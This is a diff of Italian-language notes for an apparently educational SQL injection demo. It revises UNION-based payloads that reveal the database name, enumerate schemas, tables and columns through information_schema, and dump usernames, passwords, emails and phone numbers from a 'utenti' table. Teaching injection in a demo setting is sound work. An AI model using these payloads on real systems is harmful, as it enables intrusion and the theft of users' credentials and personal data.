@@ -68,27 +68,27 @@ Tautologia:
 
 Scoprire nome database:
 ```
-' UNION SELECT 1, DATABASE(), 'x' #
+' UNION SELECT 'Nome database:', DATABASE(), '', '', '' #
 ```
 
 Elencare tutti gli schemi:
 ```
-' UNION SELECT 1, schema_name, 'x' FROM information_schema.schemata #
+' UNION SELECT schema_name, '', '', '', '' FROM information_schema.schemata #
 ```
 
 Elencare tabelle:
 ```
-' UNION SELECT 1, table_name, 'x' FROM information_schema.tables WHERE table_schema='sqli_demo' #
+' UNION SELECT 'Nome tabella:', table_name, '', '', '' FROM information_schema.tables WHERE table_schema='sqli_project' #
 ```
 
 Elencare colonne:
 ```
-' UNION SELECT 1, column_name, 'x' FROM information_schema.columns WHERE table_name='utenti' AND table_schema='sqli_demo' #
+' UNION SELECT 'Nome colonna:', column_name, '', '', '' FROM information_schema.columns WHERE table_name='utenti' AND table_schema='sqli_project' #
 ```
 
 Leggere credenziali:
 ```
-' UNION SELECT id, username, password FROM utenti #
+'UNION SELECT 'ID', 'username', 'password', 'email', 'telefono' UNION SELECT id, username, password, email, telefono FROM utenti #
 ```
 
 Aggiornare un utente:
